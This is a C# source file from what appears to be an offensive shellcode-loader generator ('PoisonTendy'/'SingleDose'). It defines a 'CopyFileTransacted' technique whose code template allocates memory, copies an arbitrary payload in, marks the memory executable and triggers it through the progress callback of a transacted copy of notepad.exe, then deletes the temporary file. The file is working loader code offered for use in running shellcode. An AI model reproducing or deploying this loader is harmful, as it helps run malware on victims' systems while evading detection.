using SingleDose.Techniques;
using System.Collections.Generic;

namespace PoisonTendy.Techniques.Loaders
{
    internal class CopyFileTransacted : ITechnique
    {
        bool ITechnique.IsLoader => true;

        bool ITechnique.IsUnsafe => false;

        string ITechnique.TechniqueName => "CopyFileTransacted";

        string ITechnique.TechniqueDescription => null;

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";

        List<string> ITechnique.TechniqueReferences => new List<string>() {
            @"https://github.com/Wra7h/FlavorTown"
        };

        List<string> ITechnique.Invokes => new List<string>() { "VirtualAlloc", "CreateTransaction", "CopyFileTransacted", "CloseHandle" };

        List<string> ITechnique.Prerequisites => null;

        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        public static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            {{PROTECT}}
            string szTempFile = System.IO.Path.GetTempFileName();

            IntPtr hTransaction = CreateTransaction(IntPtr.Zero, IntPtr.Zero, 0, 0, 0, 0, string.Empty);
            CopyFileTransacted(@""C:\Windows\notepad.exe"", szTempFile, hAlloc, IntPtr.Zero, 0, 0x0, hTransaction);

            //Cleanup
            System.IO.File.Delete(szTempFile);
            CloseHandle(hTransaction);
        }
        {{ARGS}}
        {{INVOKE}}
    }
}";
    }
}
